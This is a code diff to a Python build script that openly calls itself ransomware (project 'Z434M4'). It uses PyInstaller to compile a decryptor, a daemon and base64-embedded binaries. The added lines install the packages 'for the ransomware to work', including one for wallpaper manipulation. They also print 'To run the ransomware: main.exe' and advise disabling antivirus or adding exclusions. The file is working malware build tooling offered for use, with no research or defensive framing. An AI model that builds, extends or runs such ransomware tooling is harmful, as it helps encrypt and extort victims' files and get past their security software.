@@ -5,6 +5,7 @@ import base64
 import os
 import sys
 import shutil
+import subprocess
 
 """
 parser = argparse.ArgumentParser(description='Build Z434M4.', add_help=True)
@@ -23,6 +24,36 @@ def error(s):
     sys.exit(-1)
 
 
+def install_requirements():
+    """Install all required packages for the ransomware to work"""
+    print("Installing required packages...")
+    required_packages = [
+        "pyinstaller",
+        "cryptography",
+        "requests",
+        "pillow",  # For wallpaper manipulation
+    ]
+    
+    for package in required_packages:
+        print(f"Installing {package}...")
+        try:
+            # Use python -m pip to ensure we're using the correct pip
+            result = subprocess.run(
+                [sys.executable, "-m", "pip", "install", package],
+                capture_output=True,
+                text=True,
+                check=True
+            )
+            print(f"Successfully installed {package}")
+        except subprocess.CalledProcessError as e:
+            print(f"Error installing {package}: {e}")
+            print(f"STDOUT: {e.stdout}")
+            print(f"STDERR: {e.stderr}")
+            response = input(f"Continue despite {package} installation failure? (y/n): ")
+            if response.lower() != 'y':
+                sys.exit(1)
+
+
 def build(program):
     # Use os.path.join for Windows path compatibility
     ransomware_dir = os.path.join(os.getcwd(), "Ransomware")
@@ -34,7 +65,7 @@ def build(program):
     
     # Windows-compatible PyInstaller command with distpath set to project directory
     # --distpath specifies where to put the executable
-    command = f'pyinstaller -F --clean --noconsole "{script_path}" -n {program} --distpath "{project_dir}"'
+    command = f'pyinstaller -F --clean "{script_path}" -n {program} --distpath "{project_dir}"'
     print(f"Running: {command}")
     os.system(command)
 
@@ -136,6 +167,9 @@ def clean_dist():
 
 
 def main():
+    # First install all required packages
+    install_requirements()
+    
     # Build each component
     decryptor64 = build_decryptor()
     daemon64 = build_daemon()
@@ -155,9 +189,11 @@ def main():
     print("- base64decryptor - Base64 encoded decryptor binary")
     print("--------------------------------------")
     print("variables.py has been updated with base64 encoded binaries")
+    print("\nTo run the ransomware: main.exe")
+    print("Note: You may need to disable antivirus or add exclusions for these files")
 
 
 if __name__ == '__main__':
     main()
-    # Uncomment to clean up after building:
+    # Clean up build artifacts
     clean_dist()
